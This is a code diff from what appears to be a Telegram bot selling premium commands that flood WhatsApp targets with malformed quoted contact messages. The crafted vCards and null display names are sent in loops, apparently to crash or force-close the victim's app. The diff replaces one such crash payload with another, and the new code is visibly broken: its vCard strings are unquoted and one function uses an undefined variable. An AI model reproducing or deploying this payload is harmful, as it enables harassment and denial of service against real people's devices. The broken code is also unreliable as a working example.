@@ -1404,7 +1404,7 @@ bot.command("fcnew", checkWhatsAppConnection, checkPremium, async ctx => {
   await prosesrespone(target, ctx);
 
   for (let i = 0; i < 3; i++) {
-    await BugForclose(target)
+    await sendBugKontak(target)
     
 }
 
@@ -1422,11 +1422,8 @@ bot.command("forceclose", checkWhatsAppConnection, checkPremium, async ctx => {
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 50; i++) {
-    await FChyUi(target);
-    await aswFChyui(target);
-    await FChyUi(target);
-    await aswFChyui(target);
+  for (let i = 0; i < 5; i++) {
+    await BugKontak(target);
     
 }
 
@@ -2004,24 +2001,57 @@ target,
 }
 );
 }
-async function BugForclose(from) {
-    for (let i = 0; i < 5; i++) {
-        await kipop.relayMessage(from, {
-            "extendedTextMessage": {
-                "text": "Hai Sayang🦍",
-                "contextInfo": {
-                    "stanzaId": generateMessageID(),
-                    "participant": from,
-                    "quotedMessage": {
-                        "contactMessage": {
-                            "displayName": "\u0000",
-                            "vcard": "BEGIN:VCARD\nVERSION:3.0\nFN:Reyhan6610\nX-WA-BIZ-NAME:Reyhan6610\n\nORG:Reyhan6610;\nTEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999\nEND:VCARD"
-                        }
-                    }
-                }
-            }
-        }, {})
+async function sendBugKontak(target, from) {
+  const message = {
+    extendedTextMessage: {
+      text: "Memek",
+      contextInfo: {
+        stanzaId: generateMessageID(),
+        participant: from,
+        quotedMessage: {
+          contactMessage: {
+            displayName: "@tamainfinity",
+            vcard: BEGIN:VCARD
+VERSION:3.0
+FN:@tamainfinity
+X-WA-BIZ-NAME:@tamainfinity
+
+ORG:@tamainfinity;
+TEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999
+END:VCARD
+          }
+        }
+      }
     }
+  };
+
+  await kipop.relayMessage(from, message, {});
+}
+async function BugKontak(target) {
+  const message = {
+    extendedTextMessage: {
+      text: "Memek",
+      contextInfo: {
+        stanzaId: target,
+        participant: target,
+        quotedMessage: {
+          contactMessage: {
+            displayName: "@tamainfinity",
+            vcard: BEGIN:VCARD
+VERSION:3.0
+FN:@tamainfinity
+X-WA-BIZ-NAME:@tamainfinity
+
+ORG:@tamainfinity;
+TEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999
+END:VCARD
+          }
+        }
+      }
+    }
+  };
+
+  await kipop.relayMessage(from, message, {});
 }
 async function bulldozer(isTarget) {
   let message = {
